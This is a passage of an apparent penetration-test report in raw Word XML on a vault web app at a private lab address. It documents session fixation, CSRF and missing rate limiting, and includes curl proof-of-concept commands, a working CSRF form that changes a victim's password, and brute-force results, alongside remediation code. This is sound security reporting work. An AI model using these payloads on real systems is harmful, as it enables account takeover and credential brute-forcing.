        <w:t xml:space="preserve"> Session cookies not invalidated/renewed on authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Authentication Required:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Yes (session-based)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Proof of Concept</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Step 1: Capture Pre-Login Cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -I http://10.0.0.10/login</w:t>
        <w:br/>
        <w:t># Extract Set-Cookie header value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Step 2: Login with Valid Credentials</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"testuser1","password":"csrfhacked123"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Step 3: Access Protected Resource with Old Cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl http://10.0.0.10/vault \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=[old_session_cookie]"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Both old and new cookies grant access to the vault, confirming session fixation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Impact</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Persistent unauthorized access to user accounts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Session hijacking attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Account compromise without credential theft</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CVSS v3.1 Score</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Score:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 5.4 (Medium)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vector:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Invalidate Old Sessions on Login:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   app.post('/login', (req, res) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">     // ... authentication logic ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">     </w:t>
        <w:br/>
        <w:t xml:space="preserve">     // Destroy old session and create new one</w:t>
        <w:br/>
        <w:t xml:space="preserve">     req.session.regenerate((err) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">       if (err) return next(err);</w:t>
        <w:br/>
        <w:t xml:space="preserve">       req.session.userId = user.id;</w:t>
        <w:br/>
        <w:t xml:space="preserve">       res.json({ success: true });</w:t>
        <w:br/>
        <w:t xml:space="preserve">     });</w:t>
        <w:br/>
        <w:t xml:space="preserve">   });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Use Secure Session Management:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   - Set session cookie options: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>secure: true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>httpOnly: true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sameSite: 'strict'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Regenerate session ID after login</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement Session Timeout:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Auto-expire sessions after inactivity (30 minutes)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Add Logout Functionality:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Properly destroy sessions on logout</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots and Reproduction Steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recreation Steps:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Login to the application and capture the session cookie (connect.sid).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Logout from the application.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Login again to generate a new session cookie.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Logout again.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Login a third time and use Burp Suite to intercept the request.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>In Burp, modify the session cookie to the first captured cookie (from step 1).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Forward the request and observe successful login with the old cookie.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Verify that the old session cookie (from step 1) still grants access to /vault, confirming session fixation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> First login - capture initial session cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Second login - generate new session cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Third login - Burp intercept showing cookie replacement with first captured cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 4:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Successful login with old session cookie (session fixation confirmed)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Command Output:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Capture pre-login cookie</w:t>
        <w:br/>
        <w:t>COOKIE=$(curl -I http://10.0.0.10/login 2&gt;&amp;1 | grep 'Set-Cookie' | awk '{print $2}' | cut -d';' -f1)</w:t>
        <w:br/>
        <w:br/>
        <w:t># Login with the cookie</w:t>
        <w:br/>
        <w:t>curl -X POST http://10.0.0.10/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: $COOKIE" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"testuser","password":"password"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t># Access vault with old cookie - should still work</w:t>
        <w:br/>
        <w:t>curl http://10.0.0.10/vault \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: $COOKIE"</w:t>
        <w:br/>
        <w:br/>
        <w:t>Response: Returns vault page (vulnerable)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>HIGH PRIORITY FINDINGS (Reportable Vulnerabilities)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 5: Cross-Site Request Forgery (CSRF) - Account Update</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> MEDIUM (CVSS 4.3)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Status:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CONFIRMED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The account update endpoint (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /account/update</w:t>
      </w:r>
      <w:r>
        <w:t>) lacks CSRF protection. An attacker can create malicious web pages that force authenticated users to change their account passwords without their knowledge or consent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerability Details</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Endpoint:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> POST /account/update</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Missing Protection:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> No CSRF tokens, no SameSite attributes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Authentication Required:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Yes (session-based)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Proof of Concept</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Malicious HTML Page:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;form action="http://10.0.0.10/account/update" method="POST" id="csrfForm"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input type="hidden" name="password" value="attackerpassword"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input type="hidden" name="updatedPassword" value="attackerpassword"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input type="hidden" name="updateField" value="account"&gt;</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
        <w:br/>
        <w:t>&lt;button onclick="document.getElementById('csrfForm').submit();"&gt;Click Here&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> When authenticated user clicks button, their password is changed to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>attackerpassword</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Impact</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Forced password changes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Account lockout</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Account takeover when combined with phishing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CVSS v3.1 Score</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Score:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4.3 (Medium)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vector:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement CSRF Tokens:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   app.post('/account/update', (req, res) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">     if (!verifyCsrfToken(req.body.csrf_token)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">       return res.status(403).json({ success: false, message: "CSRF token invalid" });</w:t>
        <w:br/>
        <w:t xml:space="preserve">     }</w:t>
        <w:br/>
        <w:t xml:space="preserve">     // Process update</w:t>
        <w:br/>
        <w:t xml:space="preserve">   });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Use SameSite Cookie Attribute:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   res.cookie('connect.sid', sessionId, { </w:t>
        <w:br/>
        <w:t xml:space="preserve">     httpOnly: true, </w:t>
        <w:br/>
        <w:t xml:space="preserve">     sameSite: 'strict' </w:t>
        <w:br/>
        <w:t xml:space="preserve">   });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement Double-Submit Cookie Pattern</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Add CAPTCHA for Sensitive Operations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots and Reproduction Steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recreation Steps:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Login as victim user with known credentials.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Create a malicious HTML page with the CSRF form (copy the PoC code below into csrf_test.html).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Open the malicious HTML page in the victim's browser session (or serve it on a local server).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Click the "Click Me" button to submit the form.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Use Burp Proxy to intercept the POST /account/update request.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Observe the request lacks CSRF protection and is sent automatically.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Verify the victim's password is changed by attempting login with the new password.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Malicious CSRF HTML page</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Victim clicking the button</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Account update request in Burp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 4:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Password successfully changed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Command Output:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Create csrf_test.html with the malicious form</w:t>
        <w:br/>
        <w:t>&lt;form action="http://10.0.0.10/account/update" method="POST" id="csrfForm"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input type="hidden" name="password" value="currentpass"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input type="hidden" name="updatedPassword" value="hackedpass"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input type="hidden" name="updateField" value="account"&gt;</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
        <w:br/>
        <w:t>&lt;button onclick="document.getElementById('csrfForm').submit();"&gt;Click Me&lt;/button&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># Response after submission: {"success":true,"message":"Account password updated successfully!"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 6: Rate Limit Headers Present but Not Enforced - Login &amp; Vault Unlock Endpoints</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HIGH (CVSS 7.5)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Status:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CONFIRMED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The login and vault unlock endpoints include rate limiting headers (X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset) but do not enforce the limits. All requests return HTTP 200 OK regardless of request count, enabling unlimited brute force attacks against user accounts and vault passwords.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerability Details</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Endpoints:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> POST /login, POST /vault/unlock</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Headers Present:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> X-RateLimit-Limit: 50, X-RateLimit-Remaining, X-RateLimit-Reset</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Enforcement:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> None - no 429 responses observed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Impact:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Unlimited login and vault password brute force possible</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Proof of Concept</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Use ffuf or Burp Intruder for POST /login with 100+ payloads on password field (same session cookie).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ffuf Brute Force Results:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>csrfhacked123           [Status: 200, Size: 46, Words: 2, Lines: 1, Duration: 1025ms]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>All other payloads return Size: 50 (Invalid credentials). The correct password "csrfhacked123" returns Size: 46 with success message, confirming brute force successful after 101 attempts with no rate limiting enforcement.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Successful Login Response:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>X-RateLimit-Limit: 50</w:t>
        <w:br/>
        <w:t>X-RateLimit-Remaining: 45</w:t>
        <w:br/>
        <w:t>{"message":"Login successful.","success":true}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Impact</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Unlimited brute force attacks possible</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Weak password accounts remain vulnerable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
